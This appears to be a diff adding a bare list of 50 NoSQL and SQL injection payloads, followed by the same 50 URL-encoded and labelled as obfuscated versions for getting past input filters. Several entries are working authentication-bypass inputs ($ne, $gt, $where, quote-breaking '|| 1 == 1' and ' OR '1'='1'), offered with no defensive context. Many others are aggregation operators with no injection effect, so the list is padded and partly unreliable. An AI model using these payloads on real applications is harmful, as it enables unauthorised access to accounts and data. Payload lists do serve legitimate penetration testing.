@@ -1,0 +1,105 @@
+**Original Payloads:**
+
+1.  `{$gt: ''}`
+2.  `{$lt: ''}`
+3.  `{$ne: 'valid_value'}`
+4.  `{$regex: '.*'}`
+5.  `{$where: '1 == 1'}`
+6.  `' || 1 == 1 || '`
+7.  `" || 1 == 1 || "`
+8.  `{$exists: true}`
+9.  `{$exists: false}`
+10. `{$type: 2}`
+11. `{ $mod: [1, 0] }`
+12. `{$not: {$eq: 'valid_value'}}`
+13. `{$in: ['valid_value', 'another_value']}`
+14. `{$nin: ['valid_value', 'another_value']}`
+15. `{ $size: 0 }`
+16. `{$all: ['value1', 'value2']}`
+17. `{ $elemMatch: {field1: 'value1', field2: 'value2'}}`
+18. `{$jsonSchema: {type: 'string'}}`
+19. `{ $expr: { $eq: [1, 1] } }`
+20. `{$text: {$search: 'text'}}`
+21. `' || this.password.length > 0 || '`
+22. `" || this.username.length > 0 || "`
+23. `{$function: 'function() { return true; }'}`
+24. `{$comment: 'this is a comment'}`
+25. `{ $rand: {} }`
+26. `{$sample: { size: 1 }}`
+27. `{$addFields: {newField: 'value'}}`
+28. `{$unset: ['field1', 'field2']}`
+29. `{$replaceRoot: { newRoot: '$field'}}`
+30. `{$redact: {$cond: { if: { $eq: [1,1] }, then: '$$KEEP', else: '$$PRUNE'}}}`
+31. `' OR '1'='1'`
+32. `" OR "1"="1"`
+33. `{$gt: null}`
+34. `{$lt: null}`
+35. `{ $multiply: [ 1, 1 ] }`
+36. `{ $divide: [ 1, 1 ] }`
+37. `{$search: "a"}`
+38. `{ $substr: [ "string", 0, 1 ] }`
+39. `{ $concat: [ "a", "b" ] }`
+40. `{ $toLower: "STRING" }`
+41. `{ $toUpper: "string" }`
+42. `' && this.isAdmin == true && '`
+43. `" && this.isAdmin == true && "`
+44. `{ $dateToString: { format: "%Y-%m-%d", date: new Date() } }`
+45. `{ $convert: { input: "123", to: "int" } }`
+46. `{$abs: -1}`
+47. `{$ceil: 1.5}`
+48. `{$floor: 1.5}`
+49. `{$trunc: 1.5}`
+50. `{$sqrt: 4}`
+
+**Obfuscated Payloads:**
+
+1.  `%7B%24gt%3A%20%27%27%7D` (URL Encoding)
+2.  `%7B%24lt%3A%20%27%27%7D` (URL Encoding)
+3.  `%7B%24ne%3A%20%27valid_value%27%7D` (URL Encoding)
+4.  `%7B%24regex%3A%20%27.*%27%7D` (URL Encoding)
+5.  `%7B%24where%3A%20%271%20%3D%3D%201%27%7D` (URL Encoding)
+6.  `%27%20%7C%7C%201%20%3D%3D%201%20%7C%7C%20%27` (URL Encoding)
+7.  `%22%20%7C%7C%201%20%3D%3D%201%20%7C%7C%20%22` (URL Encoding)
+8.  `%7B%24exists%3A%20true%7D` (URL Encoding)
+9.  `%7B%24exists%3A%20false%7D` (URL Encoding)
+10. `%7B%24type%3A%202%7D` (URL Encoding)
+11. `%7B%20%24mod%3A%20%5B1%2C%200%5D%20%7D` (URL Encoding)
+12. `%7B%24not%3A%20%7B%24eq%3A%20%27valid_value%27%7D%7D` (URL Encoding)
+13. `%7B%24in%3A%20%5B%27valid_value%27%2C%20%27another_value%27%5D%7D` (URL Encoding)
+14. `%7B%24nin%3A%20%5B%27valid_value%27%2C%20%27another_value%27%5D%7D` (URL Encoding)
+15. `%7B%20%24size%3A%200%20%7D` (URL Encoding)
+16. `%7B%24all%3A%20%5B%27value1%27%2C%20%27value2%27%5D%7D` (URL Encoding)
+17. `%7B%20%24elemMatch%3A%20%7Bfield1%3A%20%27value1%27%2C%20field2%3A%20%27value2%27%7D%7D` (URL Encoding)
+18. `%7B%24jsonSchema%3A%20%7Btype%3A%20%27string%27%7D%7D` (URL Encoding)
+19. `%7B%20%24expr%3A%20%7B%20%24eq%3A%20%5B1%2C%201%5D%20%7D%20%7D` (URL Encoding)
+20. `%7B%24text%3A%20%7B%24search%3A%20%27text%27%7D%7D` (URL Encoding)
+21. `%27%20%7C%7C%20this.password.length%20%3E%200%20%7C%7C%20%27` (URL Encoding)
+22. `%22%20%7C%7C%20this.username.length%20%3E%200%20%7C%7C%20%22` (URL Encoding)
+23. `%7B%24function%3A%20%27function%28%29%20%7B%20return%20true%3B%20%7D%27%7D` (URL Encoding)
+24. `%7B%24comment%3A%20%27this%20is%20a%20comment%27%7D` (URL Encoding)
+25. `%7B%20%24rand%3A%20%7B%7D%20%7D` (URL Encoding)
+26. `%7B%24sample%3A%20%7B%20size%3A%201%20%7D%7D` (URL Encoding)
+27. `%7B%24addFields%3A%20%7BnewField%3A%20%27value%27%7D%7D` (URL Encoding)
+28. `%7B%24unset%3A%20%5B%27field1%27%2C%20%27field2%27%5D%7D` (URL Encoding)
+29. `%7B%24replaceRoot%3A%20%7B%20newRoot%3A%20%27%24field%27%7D%7D` (URL Encoding)
+30. `%7B%24redact%3A%20%7B%24cond%3A%20%7B%20if%3A%20%7B%20%24eq%3A%20%5B1%2C1%5D%20%7D%2C%20then%3A%20%27%24%24KEEP%27%2C%20else%3A%20%27%24%24PRUNE%27%7D%7D%7D` (URL Encoding)
+31. `%27%20OR%20%271%27%3D%271%27` (URL Encoding)
+32. `%22%20OR%20%221%22%3D%221%22` (URL Encoding)
+33. `%7B%24gt%3A%20null%7D` (URL Encoding)
+34. `%7B%24lt%3A%20null%7D` (URL Encoding)
+35. `%7B%20%24multiply%3A%20%5B%201%2C%201%20%5D%20%7D` (URL Encoding)
+36. `%7B%20%24divide%3A%20%5B%201%2C%201%20%5D%20%7D` (URL Encoding)
+37. `%7B%24search%3A%20%22a%22%7D` (URL Encoding)
+38. `%7B%20%24substr%3A%20%5B%20%22string%22%2C%200%2C%201%20%5D%20%7D` (URL Encoding)
+39. `%7B%20%24concat%3A%20%5B%20%22a%22%2C%20%22b%22%20%5D%20%7D` (URL Encoding)
+40. `%7B%20%24toLower%3A%20%22STRING%22%20%7D` (URL Encoding)
+41. `%7B%20%24toUpper%3A%20%22string%22%20%7D` (URL Encoding)
+42. `%27%20%26%26%20this.isAdmin%20%3D%3D%20true%20%26%26%20%27` (URL Encoding)
+43. `%22%20%26%26%20this.isAdmin%20%3D%3D%20true%20%26%26%20%22` (URL Encoding)
+44. `%7B%20%24dateToString%3A%20%7B%20format%3A%20%22%25Y-%25m-%25d%22%2C%20date%3A%20new%20Date%28%29%20%7D%20%7D` (URL Encoding)
+45. `%7B%20%24convert%3A%20%7B%20input%3A%20%22123%22%2C%20to%3A%20%22int%22%20%7D%20%7D` (URL Encoding)
+46. `%7B%24abs%3A%20-1%7D` (URL Encoding)
+47. `%7B%24ceil%3A%201.5%7D` (URL Encoding)
+48. `%7B%24floor%3A%201.5%7D` (URL Encoding)
+49. `%7B%24trunc%3A%201.5%7D` (URL Encoding)
+50. `%7B%24sqrt%3A%204%7D` (URL Encoding)
